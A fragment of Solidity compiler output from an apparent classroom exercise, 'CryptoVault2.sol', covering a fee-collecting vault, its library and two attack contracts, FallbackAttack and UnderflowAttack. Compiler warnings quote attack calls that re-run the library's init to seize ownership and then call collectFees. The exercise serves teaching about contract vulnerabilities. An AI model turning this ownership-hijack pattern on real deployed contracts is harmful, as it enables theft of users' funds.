											"begin": 5411,
											"end": 5670,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										}
									],
									".data": {
										"8B2C0CC110CB22F213AE6D036672AD90F933D31D663E6D083B02FB50136231C8": "456c206f776e6572207961206861207369646f206d6f646966696361646f2079206e6f2070756564652063616d6269617273652e"
									}
								}
							}
						},
						"methodIdentifiers": {
							"collectFees(address,uint256)": "a033fcd4",
							"init(address,address)": "f09a4016"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.4+commit.1dca32f3\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"PRACTICA 9/CryptoVault2.sol\":\"VaultLib\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"PRACTICA 9/CryptoVault2.sol\":{\"keccak256\":\"0xd47d0ccc73f25845eb52593e0e02f343d9ae0bdc04f9aeaac9d3895fd5cf5c65\",\"urls\":[\"bzz-raw://63d1cc1997da08857ae0a87ee61e0079573419566f3653b55f3e1014c9da055a\",\"dweb:/ipfs/QmTa6eRzByangAxzcA4PksJHpRdZsnD8HdMk1jin5rdH2o\"]},\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xcc78a17dd88fa5a2edc60c8489e2f405c0913b377216a5b26b35656b2d0dab52\",\"urls\":[\"bzz-raw://526dc85e1f9b9b45830e202568d267d93dde7a4fcccf4ad7798dadcd92304d3c\",\"dweb:/ipfs/QmaoXMB972J3cSDLtBq3xBo4jLwqD2uzXTwujtSPqkYVhR\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol": {
				"SafeMath": {
					"abi": [],
					"devdoc": {
						"details": "Wrappers over Solidity's arithmetic operations with added overflow checks. * Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. * Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.",
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":630:7224  library SafeMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":630:7224  library SafeMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n\n    auxdata: 0xa2646970667358221220cf0d5e96eab609dd34fc3d073ff0d8f66660731d79f366345b8b12cdc85c17a864736f6c63430006040033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60566023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220cf0d5e96eab609dd34fc3d073ff0d8f66660731d79f366345b8b12cdc85c17a864736f6c63430006040033",
							"opcodes": "PUSH1 0x56 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xCF 0xD 0x5E SWAP7 0xEA 0xB6 MULMOD 0xDD CALLVALUE 0xFC RETURNDATASIZE SMOD EXTCODEHASH CREATE 0xD8 0xF6 PUSH7 0x60731D79F36634 JUMPDEST DUP12 SLT 0xCD 0xC8 0x5C OR 0xA8 PUSH5 0x736F6C6343 STOP MOD DIV STOP CALLER ",
							"sourceMap": "630:6594:1:-:0;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220cf0d5e96eab609dd34fc3d073ff0d8f66660731d79f366345b8b12cdc85c17a864736f6c63430006040033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xCF 0xD 0x5E SWAP7 0xEA 0xB6 MULMOD 0xDD CALLVALUE 0xFC RETURNDATASIZE SMOD EXTCODEHASH CREATE 0xD8 0xF6 PUSH7 0x60731D79F36634 JUMPDEST DUP12 SLT 0xCD 0xC8 0x5C OR 0xA8 PUSH5 0x736F6C6343 STOP MOD DIV STOP CALLER ",
							"sourceMap": "630:6594:1:-:0;;;;;;12:1:-1;9;2:12"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17200",
								"executionCost": "97",
								"totalCost": "17297"
							},
							"internal": {
								"add(uint256,uint256)": "infinite",
								"div(uint256,uint256)": "infinite",
								"div(uint256,uint256,string memory)": "infinite",
								"mod(uint256,uint256)": "infinite",
								"mod(uint256,uint256,string memory)": "infinite",
								"mul(uint256,uint256)": "infinite",
								"sub(uint256,uint256)": "infinite",
								"sub(uint256,uint256,string memory)": "infinite",
								"tryAdd(uint256,uint256)": "infinite",
								"tryDiv(uint256,uint256)": "infinite",
								"tryMod(uint256,uint256)": "infinite",
								"tryMul(uint256,uint256)": "infinite",
								"trySub(uint256,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"source": -1,
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY",
									"source": -1
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE",
									"source": -1
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"source": -1,
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ",
									"source": -1
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID",
									"source": -1
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS",
									"source": -1
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"source": -1,
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8",
									"source": -1
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN",
									"source": -1
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220cf0d5e96eab609dd34fc3d073ff0d8f66660731d79f366345b8b12cdc85c17a864736f6c63430006040033",
									".code": [
										{
											"begin": 630,
											"end": 7224,
											"name": "PUSHDEPLOYADDRESS",
											"source": 1
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "ADDRESS",
											"source": 1
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.4+commit.1dca32f3\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Wrappers over Solidity's arithmetic operations with added overflow checks. * Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. * Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.\",\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":\"SafeMath\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xcc78a17dd88fa5a2edc60c8489e2f405c0913b377216a5b26b35656b2d0dab52\",\"urls\":[\"bzz-raw://526dc85e1f9b9b45830e202568d267d93dde7a4fcccf4ad7798dadcd92304d3c\",\"dweb:/ipfs/QmaoXMB972J3cSDLtBq3xBo4jLwqD2uzXTwujtSPqkYVhR\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"formattedMessage": "PRACTICA 9/CryptoVault2.sol:196:9: Warning: Return value of low-level calls not used.\n        attackedContract.call(abi.encodeWithSignature(\"init(address)\", address(this)));\n        ^----------------------------------------------------------------------------^\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 7392,
					"file": "PRACTICA 9/CryptoVault2.sol",
					"start": 7314
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"formattedMessage": "PRACTICA 9/CryptoVault2.sol:198:9: Warning: Return value of low-level calls not used.\n        attackedContract.call(abi.encodeWithSignature(\"collectFees()\"));\n        ^-------------------------------------------------------------^\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 7512,
					"file": "PRACTICA 9/CryptoVault2.sol",
					"start": 7449
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"formattedMessage": "PRACTICA 9/CryptoVault2.sol:140:5: Warning: Function state mutability can be restricted to pure\n    function init(address storageOwner,address _owner) public {\n    ^ (Relevant source part starts here and spans across multiple lines).\n",
				"message": "Function state mutability can be restricted to pure",
				"severity": "warning",
				"sourceLocation": {
					"end": 5670,
					"file": "PRACTICA 9/CryptoVault2.sol",
					"start": 5411
				},
				"type": "Warning"
			}
		],
		"sources": {
			"PRACTICA 9/CryptoVault2.sol": {
				"ast": {
					"absolutePath": "PRACTICA 9/CryptoVault2.sol",
					"exportedSymbols": {
						"CryptoVault": [
							163
						],
						"FallbackAttack": [
							299
						],
						"UnderflowAttack": [
							384
						],
						"VaultLib": [
							240
						]
					},
					"id": 385,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "37:23:0"
						},
						{
							"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol",
							"file": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol",
							"id": 2,
							"nodeType": "ImportDirective",
							"scope": 385,
							"sourceUnit": 740,
							"src": "535:110:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 163,
							"linearizedBaseContracts": [
								163
							],
							"name": "CryptoVault",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "8da5cb5b",
									"id": 4,
									"name": "owner",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 163,
									"src": "741:20:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 3,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "741:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"id": 7,
									"libraryName": {
										"contractScope": null,
										"id": 5,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 739,
										"src": "800:8:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$739",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "794:27:0",
									"typeName": {
										"id": 6,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "813:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": false,
									"functionSelector": "9003adfe",
									"id": 9,
									"name": "collectedFees",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 163,
									"src": "868:25:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 8,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "868:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 11,
									"name": "prcFee",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 163,
									"src": "1150:12:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint8",
										"typeString": "uint8"
									},
									"typeName": {
										"id": 10,
										"name": "uint8",
										"nodeType": "ElementaryTypeName",
										"src": "1150:5:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint8",
											"typeString": "uint8"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"functionSelector": "5e5c06e2",
									"id": 15,
									"name": "accounts",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 163,
									"src": "1543:44:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 14,
										"keyType": {
											"id": 12,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "1552:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "1543:28:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 13,
											"name": "uint256",
											"nodeType": "ElementaryTypeName",
											"src": "1563:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 32,
										"nodeType": "Block",
										"src": "1929:393:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 22,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 20,
														"name": "prcFee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 11,
														"src": "1996:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 21,
														"name": "_prcFee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 17,
														"src": "2005:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														}
													},
													"src": "1996:16:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"id": 23,
												"nodeType": "ExpressionStatement",
												"src": "1996:16:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 27,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4,
															"src": "2244:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 28,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -15,
																"src": "2251:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 29,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "2251:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 24,
															"name": "VaultLib",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 240,
															"src": "2230:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_VaultLib_$240_$",
																"typeString": "type(library VaultLib)"
															}
														},
														"id": 26,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "init",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 199,
														"src": "2230:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_delegatecall_nonpayable$_t_address_$_t_address_$returns$__$",
															"typeString": "function (address,address)"
														}
													},
													"id": 30,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2230:32:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 31,
												"nodeType": "ExpressionStatement",
												"src": "2230:32:0"
											}
										]
									},
									"documentation": null,
									"id": 33,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 18,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 17,
												"name": "_prcFee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 33,
												"src": "1907:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 16,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "1907:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1884:37:0"
									},
									"returnParameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1929:0:0"
									},
									"scope": 163,
									"src": "1873:449:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 67,
										"nodeType": "Block",
										"src": "2522:276:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 40,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 37,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -15,
																	"src": "2542:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 38,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "2542:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "313030",
																"id": 39,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2555:3:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_100_by_1",
																	"typeString": "int_const 100"
																},
																"value": "100"
															},
															"src": "2542:16:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "496e73756666696369656e74206465706f736974",
															"id": 41,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2560:22:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_f8fcaef683f0d1614f3145343efc9a3d2cb7c83cead426db44ecb090c666d824",
																"typeString": "literal_string \"Insufficient deposit\""
															},
															"value": "Insufficient deposit"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_f8fcaef683f0d1614f3145343efc9a3d2cb7c83cead426db44ecb090c666d824",
																"typeString": "literal_string \"Insufficient deposit\""
															}
														],
														"id": 36,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "2533:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 42,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2533:50:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 43,
												"nodeType": "ExpressionStatement",
												"src": "2533:50:0"
											},
											{
												"assignments": [
													45
												],
												"declarations": [
													{
														"constant": false,
														"id": 45,
														"name": "fee",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 67,
														"src": "2594:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 44,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2594:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 52,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 51,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 49,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 46,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -15,
																"src": "2605:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 47,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "value",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "2605:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "*",
														"rightExpression": {
															"argumentTypes": null,
															"id": 48,
															"name": "prcFee",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 11,
															"src": "2617:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															}
														},
														"src": "2605:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "3130303030",
														"id": 50,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2626:5:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_10000_by_1",
															"typeString": "int_const 10000"
														},
														"value": "10000"
													},
													"src": "2605:26:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2594:37:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 61,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 53,
															"name": "accounts",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 15,
															"src": "2664:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 56,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 54,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -15,
																"src": "2673:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 55,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "2673:10:0",
															"typeDescriptions": {
